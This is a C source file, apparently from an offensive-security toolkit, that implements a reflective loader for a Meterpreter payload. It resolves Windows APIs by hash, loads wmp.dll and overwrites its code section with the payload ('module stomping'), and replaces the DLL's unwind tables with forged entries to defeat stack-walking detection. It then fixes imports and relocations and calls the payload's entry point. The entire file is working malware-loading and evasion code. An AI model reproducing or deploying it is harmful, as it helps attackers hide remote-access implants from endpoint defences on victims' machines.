#include <Macros.h>
#include <Funcs.h>

SEC( text, B ) PVOID LoadAndStomp ( PAPI pApi, PCHAR DllName ) {

    UNWIND_INFO u = { 0 };
    UNWIND_CODE uc1 = { 0 };
    UNWIND_CODE uc2 = { 0 };
    USHORT stack_size = (USHORT) 0xffff;

    // Gamble with stack size
    uc1.UnwindOp = UWOP_ALLOC_LARGE;
    uc1.OpInfo   = 1;
    uc2.FrameOffset = stack_size;
    u.CountOfCodes  = 3;
    u.UnwindCode[0] = uc1;
    u.UnwindCode[1] = uc2;
    u.UnwindCode[2] = uc2;

    // Endless stack frames
    // uc1.UnwindOp = UWOP_ALLOC_LARGE;
    // uc1.OpInfo = 1;
    // uc2.FrameOffset = stack_size;
    // u.CountOfCodes = 4;
    // u.UnwindCode[0] = uc1;
    // u.UnwindCode[1] = uc2;
    // u.UnwindCode[2] = uc2;
    // u.UnwindCode[3].UnwindOp = 11;

    // Load the DLL with DONT_RESOLVE_DLL_REFERENCES flag
    HMODULE hModule = pApi->LoadLibraryExA(DllName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hModule) {
        return NULL;
    }

    // Get section information
    PIMAGE_DOS_HEADER dosHeader     = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders     = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section   = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD pdata_rva     = 0;
    DWORD pdata_size    = 0;
    DWORD rdata_rva     = 0;
    DWORD rdata_size    = 0;
    DWORD text_rva      = 0;
    DWORD text_size     = 0;
    for (INT i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (StringCompareA((PCHAR)section->Name, ".text") == 0) {
            text_rva = section->VirtualAddress;
            text_size = section->Misc.VirtualSize;
        }
        if (StringCompareA((PCHAR)section->Name, ".pdata") == 0) {
            pdata_rva = section->VirtualAddress;
            pdata_size = section->Misc.VirtualSize;
        }
        if (StringCompareA((PCHAR)section->Name, ".rdata") == 0) {
            rdata_rva = section->VirtualAddress;
            rdata_size = section->Misc.VirtualSize;
        }
        section++;
    }

    if (!pdata_rva || !pdata_size || !rdata_rva || !rdata_size || !text_rva || !text_size) {
        return NULL;
    }

    // Calculate # of RUNTIME_FUNCTIONs
    LPVOID rdata = (PBYTE)hModule + rdata_rva;
    LPVOID pdata = (PBYTE)hModule + pdata_rva;
    PRUNTIME_FUNCTION runtimeFunction = (PRUNTIME_FUNCTION)pdata;
    DWORD numFunctions = pdata_size / sizeof(RUNTIME_FUNCTION);


    // Change protection of the .pdata section to read-write (RW)
    DWORD oldProtect = 0;
    if (!pApi->VirtualProtect(rdata, rdata_size, PAGE_READWRITE, &oldProtect)) {
        return NULL;
    }
    if (!pApi->VirtualProtect(pdata, pdata_size, PAGE_READWRITE, &oldProtect)) {
        return NULL;
    }

    // Sneak the malicious UNWIND_INFO into .rdata
    // Since the DLL isn't being used by the actual process, this should be fine to do
    DWORD pUi_rva = rdata_rva;
    *(PUNWIND_INFO)((PBYTE)hModule + pUi_rva) = u;

    // Overwrite all the unwind info
    PUNWIND_INFO pUnwindInfoOG = NULL;
    for (DWORD i = 0; i < numFunctions; i++) {

        // We overwrite the boundaries of every RUNTIME_FUNCTION rather than just one and nulling the others
        // Because of some search algorithm the default symbol resolver uses (its just easier this way)

        // Overwrite every RUNTIME_FUNCTION's lower boundary (in .pdata)
        runtimeFunction[i].BeginAddress = text_rva;

        // Overwrite every RUNTIME_FUNCTION's upper boundary (in .pdata). Copied alignment from austin
        // Alignment just in case we are executing at the bottom bottomm of the .text section (lol you probably forgot to check shellcode vs .text size but w/e)
        runtimeFunction[i].EndAddress   = text_rva + text_size + 0x1000 - 1 & ~(0x1000 - 1);


        // Overwrite the UNWIND_INFO pointer (in .pdata) with our fake one
        // We could overwrite the existing code in .rdata, but we wouldn't know if our CountOfCodes line up
        // Which could get messy
        // pUnwindInfoOG = (PUNWIND_INFO)((PBYTE)hModule + runtimeFunction[i].UnwindData);
        // *pUnwindInfoOG = u;

        // Properly overwrite the UnwindInfoAddress using the rva to our UNWIND_INFO we wrote into .rdata
        * (DWORD*)&runtimeFunction[i].UnwindData = pUi_rva;
    }

    // Cleanup
    if (!pApi->VirtualProtect(rdata, rdata_size, PAGE_READONLY, &oldProtect)) {
        return NULL;
    }
    if (!pApi->VirtualProtect(pdata, pdata_size, PAGE_READONLY, &oldProtect)) {
        return NULL;
    }

    return (PBYTE) hModule + text_rva;
}
SEC( text, B ) VOID Entry ( VOID )
{

    PVOID	MsfBase		= NULL;

    PIMAGE_NT_HEADERS		NtHeaders		= NULL;
    PIMAGE_SECTION_HEADER   SecHeader       = NULL;
    PIMAGE_DATA_DIRECTORY   ImageDir        = NULL;

    PVOID	pLdrLoadDll		= NULL;
    PVOID	pNtAVM			= NULL;
    PVOID	pNtPVM			= NULL;
    PVOID	pLoadLib		= NULL;
    PVOID	pGetProcAddr	= NULL;

    PVOID   pAlloc			= NULL;  
    DWORD	DllSize			= NULL;
    DWORD64	TotalSize		= NULL;
    DWORD	OverlaySize		= NULL;
    PVOID	SecMemory       = NULL;
    PVOID	SecMemorySize   = 0;
    DWORD	Protection      = 0;
    ULONG	OldProtection   = 0;

    DWORD SizeOfLastRawSection		= 0;
    DWORD SumOfRawSectionSize		= 0;
    PVOID LastRawSection			= NULL;
    
    API   Api	    = { 0 };

    MsfBase 	    = KaynCaller();
    Api.ntdll		= LdrModulePeb( NTDLL_HASH );
    Api.kernel32	= LdrModulePeb( K32_HASH );

    Api.LoadLibraryExA = LdrFunctionAddr( Api.kernel32, H_LOADLIBRARYEXA );
    Api.LoadLibraryA   = LdrFunctionAddr( Api.kernel32, H_LOADLIBRARYA );
    Api.GetProcAddress = LdrFunctionAddr( Api.kernel32, H_GETPROCADDRESS );
    Api.VirtualProtect = LdrFunctionAddr( Api.kernel32, H_VIRTUALPROTECT );
    Api.VirtualAlloc   = LdrFunctionAddr( Api.kernel32, H_VIRTUALALLOC );

    NtHeaders		= ( PVOID ) ( MsfBase + ( ( PIMAGE_DOS_HEADER ) MsfBase )->e_lfanew );
    DllSize	  		= NtHeaders->OptionalHeader.SizeOfImage;

    // ---------------------------------------------------------------------------
    // Calculate the size of the Overlay 
    // Patched value contains the RDLL + Overlay Size
    // Total size - Sum of the raw size of sections + the offset to the first section = Overlay
    // ---------------------------------------------------------------------------

    
    OverlaySize		= *( PDWORD ) ( ( PBYTE ) MsfBase + 47 ); 							// Reflective DLL + Overlay size
    
    SecHeader 		= IMAGE_FIRST_SECTION( NtHeaders );
    for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
    {
        if ( i == NtHeaders->FileHeader.NumberOfSections - 1 )
        {
            LastRawSection			= MsfBase + SecHeader[ i ].PointerToRawData;
            SizeOfLastRawSection 	= SecHeader[ i ].SizeOfRawData;
        }
        SumOfRawSectionSize += SecHeader[ i ].SizeOfRawData;
    }
    OverlaySize 	-= SumOfRawSectionSize + SecHeader[ 0 ].PointerToRawData;		// Ignored everything PRE sections
    
    // ---------------------------------------------------------------------------
    // Total size in memory of the RDLL + Overlay
    // ---------------------------------------------------------------------------

    TotalSize 				= DllSize + OverlaySize;

    if ( pAlloc = LoadAndStomp( &Api, "wmp.dll" ) )
    {
        Api.VirtualProtect( pAlloc, TotalSize, PAGE_READWRITE, &OldProtection );

        // Zero the part of the .text section we'll use so meterpreter doesn't allocate 4 GB of memory for some reason...
        RtlSecureZeroMemory( pAlloc, TotalSize );

        // ---------------------------------------------------------------------------
        // Copy DOS + NT Header
        // ---------------------------------------------------------------------------

        CopyMemoryEx( pAlloc, MsfBase, SecHeader[ 0 ].PointerToRawData );

        // ---------------------------------------------------------------------------
        // Copy headers and section into the new memory
        // ---------------------------------------------------------------------------

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            CopyMemoryEx(
                    pAlloc	+ SecHeader[ i ].VirtualAddress,    // Section New Memory
                    MsfBase + SecHeader[ i ].PointerToRawData, // Section Raw Data
                    SecHeader[ i ].SizeOfRawData               // Section Size
            );
        }
        
        // ---------------------------------------------------------------------------
        // Copy the overlay
        // ---------------------------------------------------------------------------

        CopyMemoryEx( (PBYTE)pAlloc + DllSize, LastRawSection + SizeOfLastRawSection, OverlaySize );

        // ----------------------------------
        // Process our images import table
        // ----------------------------------
        
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];


        if ( ImageDir->VirtualAddress )
        {
            PIMAGE_THUNK_DATA        OriginalTD        	= NULL;
            PIMAGE_THUNK_DATA        FirstTD           	= NULL;

            PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor 	= NULL;
            PIMAGE_IMPORT_BY_NAME    pImportByName     	= NULL;

            PCHAR                    ImportModuleName  	= NULL;
            HMODULE                  ImportModule     	= NULL;

            LPVOID 					 Function			= NULL;
            for ( pImportDescriptor = pAlloc + ImageDir->VirtualAddress; pImportDescriptor->Name != 0; ++pImportDescriptor )
            {
                ImportModuleName =  pAlloc + pImportDescriptor->Name;
                ImportModule     =  Api.LoadLibraryA( ImportModuleName );

                OriginalTD       = pAlloc + pImportDescriptor->OriginalFirstThunk;
                FirstTD          = pAlloc + pImportDescriptor->FirstThunk;

                for ( ; OriginalTD->u1.AddressOfData != 0 ; ++OriginalTD, ++FirstTD )
                {
                    
                    if ( IMAGE_SNAP_BY_ORDINAL( OriginalTD->u1.Ordinal ) )
                    {
                        PBYTE Module 		= ImportModule;
                        DWORD ord			= OriginalTD->u1.Ordinal;
                        Function            = Api.GetProcAddress( ImportModule, ( SIZE_T ) ord );
                    }
                    
                    else
                    {
                        pImportByName       = pAlloc + OriginalTD->u1.AddressOfData;
                        DWORD  FunctionHash = HashString( pImportByName->Name, KStringLengthA( pImportByName->Name ) );
                        Function    	    = LdrFunctionAddr( ImportModule, FunctionHash );
                    }
                    if ( Function != NULL )
                        FirstTD->u1.Function = Function;
                }
            }
        }
        

        // ----------------------------
        // Process image relocations
        // ----------------------------
        
        ImageDir = & NtHeaders->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];
        
        if ( ImageDir->VirtualAddress )
            KaynLdrReloc( pAlloc, NtHeaders->OptionalHeader.ImageBase, (PVOID)( pAlloc + ImageDir->VirtualAddress ) );

        for ( DWORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
        {
            SecMemory       = (PVOID) ( pAlloc + SecHeader[ i ].VirtualAddress );
            SecMemorySize   = SecHeader[ i ].SizeOfRawData;
            Protection      = 0;
            OldProtection   = 0;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE )
                Protection = PAGE_WRITECOPY;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ )
                Protection = PAGE_READONLY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_READWRITE;

            if ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE )
                Protection = PAGE_EXECUTE;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) )
                Protection = PAGE_EXECUTE_WRITECOPY;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READ;

            if ( ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHeader[ i ].Characteristics & IMAGE_SCN_MEM_READ ) )
                Protection = PAGE_EXECUTE_READWRITE;
                
            Api.VirtualProtect( SecMemory, SecMemorySize, Protection, &OldProtection );
        }

        BOOL ( WINAPI *DllMain ) ( PVOID, DWORD, PVOID ) = ( pAlloc + NtHeaders->OptionalHeader.AddressOfEntryPoint ) ;

        DllMain( pAlloc, DLL_PROCESS_ATTACH, NULL );

        DllMain( pAlloc, 4, LastRawSection + SizeOfLastRawSection );

    }
}
